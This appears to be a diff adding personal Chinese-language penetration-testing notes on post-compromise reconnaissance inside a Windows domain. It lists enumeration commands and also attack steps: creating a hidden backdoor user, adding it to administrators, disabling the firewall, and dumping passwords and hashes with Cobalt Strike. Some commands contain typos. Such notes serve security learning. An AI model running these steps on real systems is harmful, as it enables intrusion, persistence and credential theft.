@@ -1,0 +1,50 @@
+内网信息搜集
+域内一台主机
+1、ipconfig -all
+（处于什么地位）
+dns服务器ip一般是DCip
+2、systeminfo
+查看当前系统信息
+3、进一步查看本机信息--权限问题
+    wmic product get name，version（获取软件相关版本，python3.7.0)
+    wmic service list（服务列取）
+    wmic startup get command,caption(开机启动命令）
+    schtasks /query /fo LIST /v 查看计划任务
+    版本--服务--开机启动--计划任务
+    net statistics workstation(查看主机开机时间）
+    net user（本机用户）
+    net user hack zhd123. /add(添加用户）
+    在命令窗口隐藏用户可在用户名后加$----创建隐藏用户
+    net localgroup groupname username /add（添加进用户组）
+    net localgroup administrators（查看是否有其他用户）
+    net  share（查看是否存在域共享）
+    query user :: qwinsta(查看当前在线用户）????
+
+    route print（查看路由表--网关/目标）
+    arp -a（ARP地址表）
+    netsh advfirewall set allprofiles state off(关闭防火墙）
+    whoami /all(查看SID）
+    电脑中的SID是什么？_百度知道 (baidu.com)
+4、搜集域信息
+    net user user1 /domain(搜集域信息）
+    net config workstation(搜集域名）
+    net time /domain(判断域服务器时间，DC时间一般是域时间）
+    ping DC计算机名（获得ip）
+
+    for /L %I in <1,1,254>   DO @ping -w  1 -n 1 192.168.1.%I : findstr "TTL=" (扫描内网端口）
+    net view /domain:test1（查看会话）
+    group /domain(在域控上有哪些组）
+    net group "domain computers"  /domain--0
+    net accounts /domain(查看相关密码设置）--0
+    nltest /domain_trusts （查看域信任列表）
+    nltest /DCLIST:test1 (再次确认DC）
+    nslookup -type=SRU_ldap._tcp(查看域控ip）
+    netdom query（查询） dc(查看DC)
+    wmic useraccount get /all(查看域内用户详细信息）
+    net dclist（直接查看域控）
+vnc---管理用户账户--会卡在那
+管理员启动--出现弹窗--vnc不显示卡住
+https://blog.csdn.net/qi_SJQ_/article/details/122988526
+cs与msf联动
+  cs命令框--logonpasswords--抓取密码
+  cs命令框--hashdump--抓取hash值
